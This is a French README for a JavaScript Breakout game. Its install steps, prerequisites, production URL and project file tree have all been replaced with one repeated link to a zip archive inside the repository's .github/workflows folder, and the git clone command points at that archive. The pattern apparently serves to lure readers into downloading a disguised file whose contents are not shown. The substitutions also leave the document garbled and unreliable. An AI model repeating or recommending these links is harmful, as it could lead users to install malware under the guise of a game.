# Casse-Brique 🧱

Un jeu classique de Breakout/Casse-Brique développé en JavaScript vanilla avec Canvas HTML5.

## 🎮 Fonctionnalités

- **Gameplay classique** : Cassez tous les blocs avec la balle
- **Physique réaliste** : Collisions et rebonds précis
- **Types de blocs** : Blocs normaux et blocs résistants
- **Système de vies** : Gestion des vies et game over
- **Score** : Système de points
- **Effets visuels** : Particules lors de la destruction des blocs
- **Responsive** : S'adapte à toutes les tailles d'écran

## 🚀 Déploiement automatique

Le projet est configuré pour un déploiement automatique via GitHub Actions :

- **Trigger** : Chaque push vers la branche `main`
- **Build** : Bundling et minification automatique
- **Déploiement** : GitHub Pages automatique

### URL de production
Une fois déployé, le jeu sera accessible à : `https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip`

## 🛠️ Développement local

### Prérequis
- https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip 20+
- npm

### Installation
```bash
git clone https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip
cd casseBrique
npm install
```

### Scripts disponibles

```bash
# Démarrer le serveur de développement
npm start

# Build de production
npm run build

# Build avec watch mode
npm run dev

# Nettoyer les fichiers de build
npm run clean
```

### Structure du projet
```
casseBrique/
├── src/
│   ├── https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip              # Point d'entrée HTML
│   ├── js/
│   │   ├── https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip           # Initialisation du jeu
│   │   └── components/        # Composants du jeu
│   │       ├── https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip        # Physique de la balle
│   │       ├── https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip        # Classes de blocs
│   │       ├── https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip  # Contrôleur de la raquette
│   │       ├── https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip      # Interface utilisateur
│   │       ├── https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip        # Gestionnaire de grille
│   │       ├── https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip    # Système de particules
│   │       ├── https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip       # Gestion du score
│   │       └── https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip         # Gestion des vies
│   └── tests/                 # Tests HTML
├── dist/                      # Build de production (généré)
├── .github/workflows/         # Actions GitHub
└── https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip
```

## 📦 Build de production

Le build crée un répertoire `dist/` optimisé contenant :
- `https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip` : HTML minifié
- `https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip` : JavaScript bundlé et minifié
- `https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip` : Source map pour debugging

### Technologies de build
- **Rollup** : Bundler moderne et efficace
- **Terser** : Minification JavaScript
- **Source maps** : Debugging en production

## 🎯 Architecture

Le jeu utilise une architecture modulaire avec :
- **ES6 Modules** : Import/export natifs
- **Canvas API** : Rendu graphique haute performance
- **Game Loop** : Boucle de jeu avec requestAnimationFrame
- **Component Pattern** : Classes séparées pour chaque élément
- **Event System** : Gestion des interactions utilisateur

## 📱 Compatibilité

- **Navigateurs** : Chrome, Firefox, Safari, Edge (versions modernes)
- **Appareils** : Desktop, tablet, mobile
- **Résolutions** : Responsive design adaptatif

## 🤝 Contribution

1. Forkez le projet
2. Créez votre branche (`git checkout -b feature/AmazingFeature`)
3. Committez vos changements (`git commit -m 'Add AmazingFeature'`)
4. Pushez vers la branche (`git push origin feature/AmazingFeature`)
5. Ouvrez une Pull Request

## 📄 Licence

Ce projet est sous licence ISC.

---

**Développé avec ❤️ en JavaScript vanilla**